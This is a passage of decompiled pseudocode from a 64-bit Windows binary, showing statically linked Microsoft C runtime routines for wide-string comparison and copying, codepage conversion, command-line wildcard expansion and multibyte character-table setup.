  if ( a1 != 0 && a2 != 0 )
    return sub_140022AF0((unsigned __int16 *)a1, (unsigned __int16 *)a2);
  return sub_140022AC0(a1, a2);
}


// ----- sub_140022B80 @ 0x140022b80 -----
__int64 __fastcall sub_140022B80(unsigned __int16 *a1, unsigned __int16 *a2, struct __crt_locale_pointers *a3)
{
  unsigned __int16 *v3; // rsi
  unsigned __int16 *v4; // rbp
  int v6; // eax
  struct __crt_locale_data *locinfo; // rdx
  unsigned int v8; // ecx
  unsigned int v9; // ebx
  unsigned int v10; // edi
  unsigned __int8 v11; // cl
  unsigned __int16 v12; // ax
  unsigned __int8 v13; // cl
  unsigned __int16 v14; // ax
  __int64 v15; // [rsp+20h] [rbp-38h]
  struct __crt_locale_pointers v16; // [rsp+28h] [rbp-30h] BYREF
  char v17; // [rsp+38h] [rbp-20h]

  v3 = a2;
  v4 = a1;
  if ( a1 != nullptr && a2 != nullptr )
  {
    v17 = 0;
    if ( a3 != nullptr )
    {
      v16 = *a3;
    }
    else if ( dword_1400A0560 != 0 )
    {
      v15 = sub_14001C7D8();
      v16.locinfo = *(struct __crt_locale_data **)(v15 + 144);
      v16.mbcinfo = *(struct __crt_multibyte_data **)(v15 + 136);
      sub_14001C98C(v15, (__int64 *)&v16);
      sub_14001C9F8(v15, (__int64 *)&v16.mbcinfo);
      v6 = *(_DWORD *)(v15 + 936);
      if ( (v6 & 2) == 0 )
      {
        *(_DWORD *)(v15 + 936) = v6 | 2;
        v17 = 1;
      }
    }
    else
    {
      v16 = *(struct __crt_locale_pointers *)&off_14009ECA8;
    }
    locinfo = v16.locinfo;
    if ( *((_QWORD *)v16.locinfo + 39) != 0 )
    {
      do
      {
        v9 = *v4++;
        v10 = *v3++;
        if ( v9 != v10 )
        {
          if ( (unsigned __int16)v9 >= 0x100u )
          {
            v12 = sub_140015A14(v9, &v16);
            locinfo = v16.locinfo;
          }
          else
          {
            v11 = v9;
            if ( (*((_BYTE *)&unk_140091510 + 2 * (unsigned __int8)v9 + 2) & 1) != 0 )
              v11 = *(_BYTE *)((unsigned __int8)v9 + *((_QWORD *)locinfo + 34));
            v12 = v11;
          }
          v9 = v12;
          if ( v12 != v10 )
          {
            if ( (unsigned __int16)v10 >= 0x100u )
            {
              v14 = sub_140015A14(v10, &v16);
              locinfo = v16.locinfo;
            }
            else
            {
              v13 = v10;
              if ( (*((_BYTE *)&unk_140091510 + 2 * (unsigned __int8)v10 + 2) & 1) != 0 )
                v13 = *(_BYTE *)((unsigned __int8)v10 + *((_QWORD *)locinfo + 34));
              v14 = v13;
            }
            v10 = v14;
          }
        }
        v8 = v9 - v10;
      }
      while ( v9 == v10 && v9 != 0 );
    }
    else
    {
      v8 = sub_140022AF0(v4, v3);
    }
    if ( v17 != 0 )
      *(_DWORD *)(v15 + 936) &= ~2u;
    return v8;
  }
  else
  {
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    return 0x7FFFFFFF;
  }
}


// ----- __acrt_initialize_timeset @ 0x140022d44 -----
__int64 _acrt_initialize_timeset()
{
  dword_1400A0AD0 = 28800;
  dword_1400A0AD4 = 1;
  dword_1400A0AD8 = -3600;
  qword_1400A0AE0 = (__int64)&off_14009EFA0;
  qword_1400A0AE8 = (__int64)off_14009EFB0;
  return 0;
}


// ----- sub_140022DA0 @ 0x140022da0 -----
__int64 __fastcall sub_140022DA0(_WORD *a1, __int64 a2, __int64 a3)
{
  _WORD *v3; // r9
  __int64 v5; // r8
  __int16 v6; // ax

  v3 = a1;
  if ( a1 == nullptr || a2 == 0 )
    goto LABEL_5;
  if ( a3 == 0 )
  {
    *a1 = 0;
LABEL_5:
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    return 22;
  }
  while ( *a1 != 0 )
  {
    ++a1;
    if ( --a2 == 0 )
    {
      *v3 = 0;
      goto LABEL_5;
    }
  }
  v5 = a3 - (_QWORD)a1;
  while ( 1 )
  {
    v6 = *(_WORD *)((char *)a1 + v5);
    *a1++ = v6;
    if ( v6 == 0 )
      break;
    if ( --a2 == 0 )
    {
      *v3 = 0;
      *(_DWORD *)sub_140018888() = 34;
      invalid_parameter_noinfo();
      return 34;
    }
  }
  return 0;
}


// ----- sub_140022E30 @ 0x140022e30 -----
__int64 __fastcall sub_140022E30(_WORD *a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rsi
  __int64 v5; // rdi
  _WORD *v6; // r11
  __int64 v8; // r10
  __int16 v9; // ax
  __int16 v10; // ax
  __int64 v11; // rbx
  __int64 v12; // rax

  v4 = a4;
  v5 = a2;
  v6 = a1;
  if ( a4 != 0 )
  {
    if ( a1 == nullptr )
    {
LABEL_11:
      *(_DWORD *)sub_140018888() = 22;
      invalid_parameter_noinfo();
      return 22;
    }
  }
  else if ( a1 == nullptr )
  {
    if ( a2 == 0 )
      return 0;
    goto LABEL_11;
  }
  if ( a2 == 0 )
    goto LABEL_11;
  if ( a4 == 0 )
  {
    *a1 = 0;
    return 0;
  }
  if ( a3 == 0 )
  {
    *a1 = 0;
    goto LABEL_11;
  }
  v8 = a3 - (_QWORD)a1;
  if ( a4 == -1 )
  {
    while ( 1 )
    {
      v9 = *(_WORD *)((char *)a1 + v8);
      *a1++ = v9;
      if ( v9 == 0 )
        break;
      if ( --a2 == 0 )
        goto LABEL_23;
    }
  }
  else
  {
    while ( 1 )
    {
      v10 = *(_WORD *)((char *)a1 + v8);
      v11 = a4;
      *a1++ = v10;
      if ( v10 == 0 )
        break;
      if ( --a2 != 0 && --a4 != 0 )
        continue;
      v12 = v11 - 1;
      if ( a2 == 0 )
        v12 = v11;
      if ( v12 == 0 )
        *a1 = 0;
LABEL_23:
      if ( a2 == 0 )
      {
        if ( v4 == -1 )
        {
          v6[v5 - 1] = 0;
          return 80;
        }
        else
        {
          *v6 = 0;
          *(_DWORD *)sub_140018888() = 34;
          invalid_parameter_noinfo();
          return 34;
        }
      }
      return 0;
    }
  }
  return 0;
}


// ----- unknown_libname_86 @ 0x140022f74 -----
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall unknown_libname_86(unsigned __int64 a1, unsigned __int64 a2)
{
  if ( a1 >= a2 )
    return a1 > a2;
  else
    return 0xFFFFFFFFLL;
}


// ----- ??$__acrt_convert_wcs_mbs_cp@_WDV_lambda_d8593a27d1aa8c02be35c86a17d324c4_@@U__crt_win32_buffer_internal_dynamic_resizing@@@@YAHQEB_WAEAV?$__crt_win32_buffer@DU__crt_win32_buffer_internal_dynamic_resizing@@@@AEBV_lambda_d8593a27d1aa8c02be35c86a17d324c4_@@I@Z @ 0x140022f88 -----
__int64 __fastcall __acrt_convert_wcs_mbs_cp<wchar_t,char,_lambda_d8593a27d1aa8c02be35c86a17d324c4_,__crt_win32_buffer_internal_dynamic_resizing>(
        const WCHAR *a1,
        __int64 a2,
        __int64 a3,
        UINT a4)
{
  void *v7; // rax
  unsigned int v8; // edx
  int v10; // eax
  size_t v11; // rsi
  DWORD LastError; // eax
  unsigned __int64 v13; // rdx
  void *v14; // rax
  unsigned int v15; // r8d
  int v16; // eax

  if ( a1 == nullptr )
  {
    if ( *(_BYTE *)(a2 + 40) != 0 )
    {
      free_base(*(void **)(a2 + 16));
      *(_BYTE *)(a2 + 40) = 0;
    }
    *(_QWORD *)(a2 + 16) = 0;
    *(_QWORD *)(a2 + 24) = 0;
LABEL_5:
    *(_QWORD *)(a2 + 32) = 0;
    return 0;
  }
  if ( *a1 == 0 )
  {
    if ( *(_QWORD *)(a2 + 24) == 0 )
    {
      if ( *(_BYTE *)(a2 + 40) != 0 )
      {
        free_base(*(void **)(a2 + 16));
        *(_BYTE *)(a2 + 40) = 0;
      }
      v7 = malloc_base(1u);
      *(_QWORD *)(a2 + 16) = v7;
      v8 = v7 == nullptr ? 0xC : 0;
      if ( v7 != nullptr )
        v8 = 0;
      *(_BYTE *)(a2 + 40) = v7 != nullptr;
      *(_QWORD *)(a2 + 24) = v7 != nullptr;
      if ( v8 != 0 )
        return v8;
    }
    **(_BYTE **)(a2 + 16) = 0;
    goto LABEL_5;
  }
  v10 = _acrt_WideCharToMultiByte(a4, 0, a1, -1, nullptr, 0, nullptr, nullptr);
  v11 = v10;
  if ( v10 != 0 )
  {
    v13 = *(_QWORD *)(a2 + 24);
    if ( v10 > v13 )
    {
      if ( *(_BYTE *)(a2 + 40) != 0 )
      {
        free_base(*(void **)(a2 + 16));
        *(_BYTE *)(a2 + 40) = 0;
      }
      v14 = malloc_base(v11);
      *(_QWORD *)(a2 + 16) = v14;
      v13 = v11 & -(__int64)(v14 != nullptr);
      v15 = v14 == nullptr ? 0xC : 0;
      if ( v14 != nullptr )
        v15 = 0;
      *(_BYTE *)(a2 + 40) = v14 != nullptr;
      *(_QWORD *)(a2 + 24) = v13;
      if ( v15 != 0 )
        return v15;
    }
    v16 = _acrt_WideCharToMultiByte(a4, 0, a1, -1, *(CHAR **)(a2 + 16), v13, nullptr, nullptr);
    if ( v16 != 0 )
    {
      *(_QWORD *)(a2 + 32) = v16 - 1LL;
      return 0;
    }
  }
  LastError = GetLastError();
  sub_140018818(LastError);
  return *(unsigned int *)sub_140018888();
}


// ----- ??$common_expand_argv_wildcards@D@@YAHQEAPEADQEAPEAPEAD@Z @ 0x140023134 -----
__int64 __fastcall common_expand_argv_wildcards<char>(unsigned __int8 **a1, _QWORD *a2)
{
  unsigned __int8 **v3; // rbx
  unsigned __int8 *v5; // rax
  __int64 v6; // rax
  unsigned __int8 *v7; // rcx
  unsigned int v8; // esi
  void **v9; // rdi
  void **j; // rbx
  void **v11; // rsi
  unsigned __int64 v12; // rdx
  _QWORD *v13; // rax
  signed __int64 v14; // r14
  __int64 v15; // rcx
  _BYTE *buffer_for_argv; // rax
  _BYTE *v17; // rbx
  void **k; // rbx
  void **i; // rbx
  char *v20; // rcx
  void **v21; // r14
  char *v22; // r12
  _BYTE *v23; // r8
  __int64 v24; // r15
  __int64 v25; // r15
  void **m; // rbx
  void *Block[2]; // [rsp+30h] [rbp-20h] BYREF
  __int64 v28; // [rsp+40h] [rbp-10h]
  signed __int64 v29; // [rsp+98h] [rbp+48h] BYREF
  unsigned __int64 v30; // [rsp+A0h] [rbp+50h]
  char *v31; // [rsp+A8h] [rbp+58h]

  v3 = a1;
  if ( a2 != nullptr )
  {
    *a2 = 0;
    v5 = *a1;
    *(_OWORD *)Block = 0;
    v28 = 0;
    while ( v5 != nullptr )
    {
      strcpy((char *)&v29, "*?");
      v6 = sub_140029470(v5, &v29);
      v7 = *v3;
      if ( v6 != 0 )
      {
        v8 = expand_argument_wildcards<char>(v7);
        if ( v8 != 0 )
        {
          v9 = (void **)Block[0];
          for ( i = (void **)Block[0]; i != Block[1]; ++i )
            free_base(*i);
          goto LABEL_21;
        }
      }
      else
      {
        v8 = sub_140023370(v7, 0, 0, Block);
        if ( v8 != 0 )
        {
          v9 = (void **)Block[0];
          for ( j = (void **)Block[0]; j != Block[1]; ++j )
            free_base(*j);
          goto LABEL_21;
        }
      }
      v5 = *++v3;
    }
    v9 = (void **)Block[0];
    v11 = (void **)Block[1];
    v12 = 0;
    v30 = 0;
    v13 = Block[0];
    v14 = (((char *)Block[1] - (char *)Block[0]) >> 3) + 1;
    if ( Block[0] != Block[1] )
    {
      do
      {
        v15 = -1;
        do
          ++v15;
        while ( *(_BYTE *)(*v13 + v15) != 0 );
        ++v13;
        v12 += v15 + 1;
      }
      while ( v13 != Block[1] );
      v30 = v12;
    }
    buffer_for_argv = _acrt_allocate_buffer_for_argv((((char *)Block[1] - (char *)Block[0]) >> 3) + 1, v12, 1u);
    v17 = buffer_for_argv;
    if ( buffer_for_argv == nullptr )
    {
      free_base(nullptr);
      for ( k = v9; k != v11; ++k )
        free_base(*k);
      v8 = -1;
LABEL_21:
      free_base(v9);
      return v8;
    }
    v20 = &buffer_for_argv[8 * v14];
    v21 = v9;
    v31 = v20;
    v22 = v20;
    if ( v9 != v11 )
    {
      v29 = buffer_for_argv - (_BYTE *)v9;
      do
      {
        v23 = *v21;
        v24 = -1;
        do
          ++v24;
        while ( v23[v24] != 0 );
        v25 = v24 + 1;
        if ( (unsigned int)sub_140027F20(v22, v30 + v20 - v22, v23, v25) != 0 )
          invoke_watson(nullptr, nullptr, nullptr, 0, 0);
        v20 = v31;
        *(void **)((char *)v21 + v29) = v22;
        v22 += v25;
        ++v21;
      }
      while ( v21 != v11 );
    }
    *a2 = v17;
    free_base(nullptr);
    for ( m = v9; m != v11; ++m )
      free_base(*m);
    free_base(v9);
    return 0;
  }
  else
  {
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    return 22;
  }
}


// ----- sub_140023370 @ 0x140023370 -----
__int64 __fastcall sub_140023370(__int64 a1, __int64 a2, __int64 a3, void **a4)
{
  __int64 v4; // rbp
  unsigned int v6; // edi
  unsigned __int64 v10; // rbp
  size_t v12; // r15
  char *v13; // rax
  char *v14; // rbx
  char *v15; // r14
  char *v16; // rax
  unsigned __int64 v17; // r14
  char *v18; // rax

  v4 = -1;
  v6 = 0;
  do
    ++v4;
  while ( *(_BYTE *)(a1 + v4) != 0 );
  v10 = v4 + 1;
  if ( v10 > ~a3 )
    return 12;
  v12 = v10 + a3 + 1;
  v13 = (char *)calloc_base(v12, 1u);
  v14 = v13;
  if ( a3 != 0 && (unsigned int)sub_140027F20(v13, v12, a2, a3) != 0
    || (unsigned int)sub_140027F20(&v14[a3], v12 - a3, a1, v10) != 0 )
  {
    invoke_watson(nullptr, nullptr, nullptr, 0, 0);
  }
  v15 = (char *)a4[2];
  if ( a4[1] != v15 )
    goto LABEL_17;
  if ( *a4 != nullptr )
  {
    v17 = (v15 - (_BYTE *)*a4) >> 3;
    if ( v17 <= 0x7FFFFFFFFFFFFFFFLL )
    {
      v18 = (char *)recalloc_base(*a4, 2 * v17, 8u);
      if ( v18 != nullptr )
      {
        *a4 = v18;
        a4[1] = &v18[8 * v17];
        a4[2] = &v18[16 * v17];
        free_base(nullptr);
        goto LABEL_17;
      }
      free_base(nullptr);
    }
  }
  else
  {
    *a4 = calloc_base(4u, 8u);
    free_base(nullptr);
    v16 = (char *)*a4;
    if ( *a4 != nullptr )
    {
      a4[1] = v16;
      a4[2] = v16 + 32;
LABEL_17:
      *(_QWORD *)a4[1] = v14;
      a4[1] = (char *)a4[1] + 8;
      goto LABEL_18;
    }
  }
  v6 = 12;
  free_base(v14);
LABEL_18:
  free_base(nullptr);
  return v6;
}


// ----- ??$expand_argument_wildcards@D@@YAHQEAD0AEAV?$argument_list@D@?A0x5f5c8891@@@Z @ 0x1400234f4 -----
__int64 __fastcall expand_argument_wildcards<char>(unsigned __int8 *Start, unsigned __int8 *a2, __int64 a3)
{
  __int64 i; // rbx
  unsigned __int8 v6; // al
  unsigned __int8 v8; // r8
  char v9; // al
  __int64 v10; // r13
  unsigned int v11; // r9d
  int v12; // eax
  const WCHAR *v13; // rcx
  HANDLE FirstFile; // rbx
  unsigned int v15; // ebx
  __int64 v16; // rsi
  UINT v17; // r9d
  int v18; // eax
  void *v19; // r14
  _BYTE *v20; // rcx
  char v21; // al
  unsigned int v22; // r13d
  __int64 v23; // rdx
  _BYTE v24[8]; // [rsp+30h] [rbp-D0h] BYREF
  __int64 v25; // [rsp+38h] [rbp-C8h]
  _QWORD v26[2]; // [rsp+40h] [rbp-C0h] BYREF
  void *Block; // [rsp+50h] [rbp-B0h]
  __int64 v28; // [rsp+58h] [rbp-A8h]
  __int64 v29; // [rsp+60h] [rbp-A0h]
  char v30; // [rsp+68h] [rbp-98h]
  _QWORD v31[3]; // [rsp+70h] [rbp-90h] BYREF
  char v32; // [rsp+88h] [rbp-78h]
  _QWORD v33[3]; // [rsp+90h] [rbp-70h] BYREF
  char v34; // [rsp+A8h] [rbp-58h]
  _QWORD v35[2]; // [rsp+B0h] [rbp-50h] BYREF
  void *v36; // [rsp+C0h] [rbp-40h]
  __int64 v37; // [rsp+C8h] [rbp-38h]
  __int64 v38; // [rsp+D0h] [rbp-30h]
  char v39; // [rsp+D8h] [rbp-28h]
  struct _WIN32_FIND_DATAW FindFileData; // [rsp+E0h] [rbp-20h] BYREF

  for ( i = 0x200000000801LL; a2 != Start; a2 = mbsdec(Start, a2) )
  {
    v6 = *a2 - 47;
    if ( v6 <= 0x2Du && _bittest64(&i, (char)v6) )
      break;
  }
  if ( *a2 == 58 && a2 != Start + 1 )
    return sub_140023370((__int64)Start, 0, 0, (void **)a3);
  v8 = *a2 - 47;
  if ( v8 > 0x2Du || (v9 = 1, !_bittest64(&i, (char)v8)) )
    v9 = 0;
  v10 = (a2 - Start + 1) & -(__int64)(v9 != 0);
  v25 = v10;
  memset(&FindFileData, 0, sizeof(FindFileData));
  v26[0] = 0;
  v26[1] = 0;
  Block = nullptr;
  v28 = 0;
  v29 = 0;
  v30 = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v31, nullptr);
  if ( *(_DWORD *)(v31[1] + 12LL) == 65001 )
  {
    if ( v32 != 0 )
      *(_DWORD *)(v31[0] + 936LL) &= ~2u;
    v11 = 65001;
  }
  else if ( (unsigned int)sub_14001D1F0() != 0 )
  {
    if ( v32 != 0 )
      *(_DWORD *)(v31[0] + 936LL) &= ~2u;
    v11 = 0;
  }
  else
  {
    if ( v32 != 0 )
      *(_DWORD *)(v31[0] + 936LL) &= ~2u;
    v11 = 1;
  }
  v12 = __acrt_convert_wcs_mbs_cp<char,wchar_t,_lambda_7c9dea7b4ca7285d2cdb541a38da6275_,__crt_win32_buffer_internal_dynamic_resizing>(
          Start,
          (__int64)v26,
          (__int64)v24,
          v11);
  v13 = (const WCHAR *)Block;
  if ( v12 != 0 )
    v13 = nullptr;
  FirstFile = FindFirstFileExW(v13, FindExInfoStandard, &FindFileData, FindExSearchNameMatch, nullptr, 0);
  if ( FirstFile == (HANDLE)-1LL )
  {
    v15 = sub_140023370((__int64)Start, 0, 0, (void **)a3);
    if ( v30 != 0 )
      free_base(Block);
    return v15;
  }
  v16 = (__int64)(*(_QWORD *)(a3 + 8) - *(_QWORD *)a3) >> 3;
  while ( 1 )
  {
    v35[0] = 0;
    v35[1] = 0;
    v36 = nullptr;
    v37 = 0;
    v38 = 0;
    v39 = 0;
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v33, nullptr);
    if ( *(_DWORD *)(v33[1] + 12LL) == 65001 )
    {
      if ( v34 != 0 )
        *(_DWORD *)(v33[0] + 936LL) &= ~2u;
      v17 = 65001;
    }
    else if ( (unsigned int)sub_14001D1F0() != 0 )
    {
      if ( v34 != 0 )
        *(_DWORD *)(v33[0] + 936LL) &= ~2u;
      v17 = 0;
    }
    else
    {
      if ( v34 != 0 )
        *(_DWORD *)(v33[0] + 936LL) &= ~2u;
      v17 = 1;
    }
    v18 = __acrt_convert_wcs_mbs_cp<wchar_t,char,_lambda_d8593a27d1aa8c02be35c86a17d324c4_,__crt_win32_buffer_internal_dynamic_resizing>(
            FindFileData.cFileName,
            (__int64)v35,
            (__int64)v24,
            v17);
    v19 = v36;
    v20 = v36;
    if ( v18 != 0 )
      v20 = nullptr;
    if ( *v20 == 46 )
    {
      v21 = v20[1];
      if ( v21 == 0 || v21 == 46 && v20[2] == 0 )
      {
        if ( v39 != 0 )
          free_base(v36);
        goto LABEL_52;
      }
    }
    v22 = sub_140023370((__int64)v20, (__int64)Start, v10, (void **)a3);
    if ( v22 != 0 )
      break;
    if ( v39 != 0 )
      free_base(v19);
    v10 = v25;
LABEL_52:
    if ( !FindNextFileW(FirstFile, &FindFileData) )
    {
      v23 = (__int64)(*(_QWORD *)(a3 + 8) - *(_QWORD *)a3) >> 3;
      if ( v16 != v23 )
        sub_140029030(*(_QWORD *)a3 + 8 * v16, v23 - v16, 8, unknown_libname_86);
      FindClose(FirstFile);
      if ( v30 != 0 )
        free_base(Block);
      return 0;
    }
  }
  if ( v39 != 0 )
    free_base(v19);
  FindClose(FirstFile);
  if ( v30 != 0 )
    free_base(Block);
  return v22;
}


// ----- j_??$common_expand_argv_wildcards@D@@YAHQEAPEADQEAPEAPEAD@Z @ 0x140023854 -----
// attributes: thunk
__int64 __fastcall common_expand_argv_wildcards<char>(unsigned __int8 **a1, _QWORD *a2)
{
  return ??$common_expand_argv_wildcards@D@@YAHQEAPEADQEAPEAPEAD@Z(a1, a2);
}


// ----- __acrt_GetModuleFileNameA @ 0x14002385c -----
__int64 __fastcall _acrt_GetModuleFileNameA(HMODULE a1, __int64 a2, unsigned int a3)
{
  __int64 v3; // rdi
  DWORD LastError; // eax
  int v7; // r9d
  _BYTE v8[8]; // [rsp+20h] [rbp-E0h] BYREF
  _QWORD v9[3]; // [rsp+28h] [rbp-D8h] BYREF
  char v10; // [rsp+40h] [rbp-C0h]
  _QWORD v11[4]; // [rsp+48h] [rbp-B8h] BYREF
  __int64 v12; // [rsp+68h] [rbp-98h]
  char v13; // [rsp+70h] [rbp-90h]
  WCHAR Filename[264]; // [rsp+80h] [rbp-80h] BYREF

  v3 = a3;
  if ( GetModuleFileNameW(a1, Filename, 0x105u) != 0 )
  {
    v12 = 0;
    v11[0] = a2;
    v11[1] = v3;
    v11[3] = v3;
    v11[2] = a2;
    v13 = 0;
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v9, nullptr);
    v7 = 65001;
    if ( *(_DWORD *)(v9[1] + 12LL) == 65001 )
    {
      if ( v10 != 0 )
        *(_DWORD *)(v9[0] + 936LL) &= ~2u;
    }
    else if ( (unsigned int)sub_14001D1F0() != 0 )
    {
      if ( v10 != 0 )
        *(_DWORD *)(v9[0] + 936LL) &= ~2u;
      v7 = 0;
    }
    else
    {
      if ( v10 != 0 )
        *(_DWORD *)(v9[0] + 936LL) &= ~2u;
      v7 = 1;
    }
    __acrt_convert_wcs_mbs_cp<wchar_t,char,_lambda_f788ae46380686e8b737efdd8c720d07_,__crt_win32_buffer_no_resizing>(
      Filename,
      (__int64)v11,
      (__int64)v8,
      v7);
    return (unsigned int)v12;
  }
  else
  {
    LastError = GetLastError();
    sub_140018818(LastError);
    return 0;
  }
}


// ----- ??$?RV_lambda_efdfa57d1f175319df784efa44bb7b81_@@AEAV_lambda_5f0a4c1567f8adc6734073e5d1e1b35c_@@V_lambda_2e8a7d3640ea6ccb4c2413664c2db6fd_@@@?$__crt_seh_guarded_call@X@@QEAAX$$QEAV_lambda_efdfa57d1f175319df784efa44bb7b81_@@AEAV_lambda_5f0a4c1567f8adc6734073e5d1e1b35c_@@$$QEAV_lambda_2e8a7d3640ea6ccb4c2413664c2db6fd_@@@Z @ 0x140023980 -----
void __fastcall __crt_seh_guarded_call<void>::operator()<_lambda_efdfa57d1f175319df784efa44bb7b81_,_lambda_5f0a4c1567f8adc6734073e5d1e1b35c_ &,_lambda_2e8a7d3640ea6ccb4c2413664c2db6fd_>(
        __int64 a1,
        int *a2,
        volatile signed __int32 ****a3,
        int *a4)
{
  _OWORD *v6; // rax
  _OWORD *v7; // rcx
  __int64 v8; // r8
  __int64 i; // r9
  _OWORD *v10; // rax
  _OWORD *v11; // rcx
  void **v12; // rcx

  _vcrt_lock(*a2);
  v6 = (**a3)[17] + 6;
  v7 = qword_1400A0BB0;
  if ( qword_1400A0BB0 == nullptr )
    goto LABEL_7;
  if ( (**a3)[17] == (volatile signed __int32 *)-24LL )
  {
    memset(qword_1400A0BB0, 0, 0x101u);
LABEL_7:
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    v8 = 2;
    goto LABEL_8;
  }
  v8 = 2;
  for ( i = 2; i != 0; --i )
  {
    *v7 = *v6;
    v7[1] = v6[1];
    v7[2] = v6[2];
    v7[3] = v6[3];
    v7[4] = v6[4];
    v7[5] = v6[5];
    v7[6] = v6[6];
    v7 += 8;
    *(v7 - 1) = v6[7];
    v6 += 8;
  }
  *(_BYTE *)v7 = *(_BYTE *)v6;
LABEL_8:
  v10 = (_OWORD *)((char *)(**a3)[17] + 281);
  v11 = qword_1400A0BB8;
  if ( qword_1400A0BB8 == nullptr )
  {
LABEL_13:
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    goto LABEL_14;
  }
  if ( (**a3)[17] == (volatile signed __int32 *)-281LL )
  {
    memset(qword_1400A0BB8, 0, 0x100u);
    goto LABEL_13;
  }
  do
  {
    *v11 = *v10;
    v11[1] = v10[1];
    v11[2] = v10[2];
    v11[3] = v10[3];
    v11[4] = v10[4];
    v11[5] = v10[5];
    v11[6] = v10[6];
    v11 += 8;
    *(v11 - 1) = v10[7];
    v10 += 8;
    --v8;
  }
  while ( v8 != 0 );
LABEL_14:
  if ( _InterlockedExchangeAdd(**a3[1], 0xFFFFFFFF) == 1 )
  {
    v12 = (void **)*a3[1];
    if ( *v12 != &unk_14009EFC0 )
      free_base(*v12);
  }
  **a3[1] = (**a3)[17];
  _InterlockedIncrement((**a3)[17]);
  _vcrt_unlock(*a4);
}


// ----- ?getSystemCP@@YAHH@Z @ 0x140023b50 -----
__int64 __fastcall getSystemCP(UINT a1)
{
  UINT OEMCP; // eax
  _QWORD v4[3]; // [rsp+20h] [rbp-28h] BYREF
  char v5; // [rsp+38h] [rbp-10h]

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v4, nullptr);
  dword_1400A0BC8 = 0;
  switch ( a1 )
  {
    case 0xFFFFFFFE:
      dword_1400A0BC8 = 1;
      OEMCP = GetOEMCP();
LABEL_5:
      a1 = OEMCP;
      break;
    case 0xFFFFFFFD:
      dword_1400A0BC8 = 1;
      OEMCP = GetACP();
      goto LABEL_5;
    case 0xFFFFFFFC:
      dword_1400A0BC8 = 1;
      a1 = *(_DWORD *)(v4[1] + 12LL);
      break;
    default:
      break;
  }
  if ( v5 != 0 )
    *(_DWORD *)(v4[0] + 936LL) &= ~2u;
  return a1;
}


// ----- ?setSBCS@@YAXPEAU__crt_multibyte_data@@@Z @ 0x140023bd0 -----
void __fastcall setSBCS(struct __crt_multibyte_data *a1)
{
  __int64 v2; // rdx
  _WORD *v3; // rdi
  __int64 i; // rcx
  __int64 j; // rdi
  char *v6; // rcx
  __int64 v7; // rbx
  char *v8; // rcx

  memset((char *)a1 + 24, 0, 0x101u);
  v2 = 0;
  v3 = (_WORD *)((char *)a1 + 12);
  *(_QWORD *)((char *)a1 + 4) = 0;
  *((_QWORD *)a1 + 68) = 0;
  for ( i = 6; i != 0; --i )
    *v3++ = 0;
  for ( j = 0; j < 257; ++j )
  {
    v6 = (char *)&unk_14009EFC0 + j;
    v6[a1 - (struct __crt_multibyte_data *)&unk_14009EFD8 + 48] = v6[24];
  }
  v7 = a1 - (struct __crt_multibyte_data *)&unk_14009F0D9;
  do
  {
    v8 = (char *)&unk_14009EFC0 + v2++;
    v8[v7 + 562] = v8[281];
  }
  while ( v2 < 256 );
}


// ----- ?setSBUpLow@@YAXPEAU__crt_multibyte_data@@@Z @ 0x140023c68 -----
void __fastcall setSBUpLow(struct __crt_multibyte_data *a1)
{
  UINT v2; // ecx
  unsigned int v3; // eax
  char *v4; // rcx
  __int64 v5; // rbx
  BYTE v6; // al
  BYTE *LeadByte; // rdx
  unsigned int v8; // r8d
  __int64 i; // rcx
  WORD *v10; // rdx
  char *v11; // rax
  char v12; // cl
  unsigned int v13; // edx
  char *v14; // rcx
  char v15; // al
  struct _cpinfo CPInfo; // [rsp+50h] [rbp-B0h] BYREF
  char v17[256]; // [rsp+70h] [rbp-90h] BYREF
  char v18[256]; // [rsp+170h] [rbp+70h] BYREF
  char v19[256]; // [rsp+270h] [rbp+170h] BYREF
  WORD CharType[512]; // [rsp+370h] [rbp+270h] BYREF

  v2 = *((_DWORD *)a1 + 1);
  memset(&CPInfo, 0, sizeof(CPInfo));
  if ( v2 == 65001 || !GetCPInfo(v2, &CPInfo) )
  {
    v13 = 0;
    v14 = (char *)a1 + 25;
    do
    {
      if ( v13 - 97 + 32 > 0x19 )
      {
        if ( v13 - 97 > 0x19 )
        {
          v15 = 0;
        }
        else
        {
          *v14 |= 0x20u;
          v15 = v13 - 32;
        }
      }
      else
      {
        *v14 |= 0x10u;
        v15 = v13 + 32;
      }
      v14[256] = v15;
      ++v13;
      ++v14;
    }
    while ( v13 < 0x100 );
  }
  else
  {
    v3 = 0;
    v4 = v17;
    v5 = 256;
    do
      *v4++ = v3++;
    while ( v3 < 0x100 );
    v6 = CPInfo.LeadByte[0];
    LeadByte = CPInfo.LeadByte;
    v17[0] = 32;
    while ( v6 != 0 )
    {
      v8 = LeadByte[1];
      for ( i = v6; (unsigned int)i <= v8 && (unsigned int)i < 0x100; i = (unsigned int)(i + 1) )
        v17[i] = 32;
      LeadByte += 2;
      v6 = *LeadByte;
    }
    _acrt_GetStringTypeA(nullptr, 1u, (__int64)v17, 256, CharType, *((_DWORD *)a1 + 1), 0);
    _acrt_LCMapStringA(nullptr, *((wchar_t **)a1 + 68), 0x100u, v17, 256, v18, 256, *((_DWORD *)a1 + 1), 0);
    _acrt_LCMapStringA(nullptr, *((wchar_t **)a1 + 68), 0x200u, v17, 256, v19, 256, *((_DWORD *)a1 + 1), 0);
    v10 = CharType;
    v11 = (char *)a1 + 25;
    do
    {
      if ( (*(_BYTE *)v10 & 1) != 0 )
      {
        *v11 |= 0x10u;
        v12 = v11[v18 - (char *)a1 - 25];
      }
      else if ( (*(_BYTE *)v10 & 2) != 0 )
      {
        *v11 |= 0x20u;
        v12 = v11[v19 - (char *)a1 - 25];
      }
      else
      {
        v12 = 0;
      }
      v11[256] = v12;
      ++v10;
      ++v11;
      --v5;
    }
    while ( v5 != 0 );
  }
}


// ----- ?setmbcp_internal@@YAHH_NQEAU__acrt_ptd@@QEAPEAU__crt_multibyte_data@@@Z @ 0x140023e60 -----
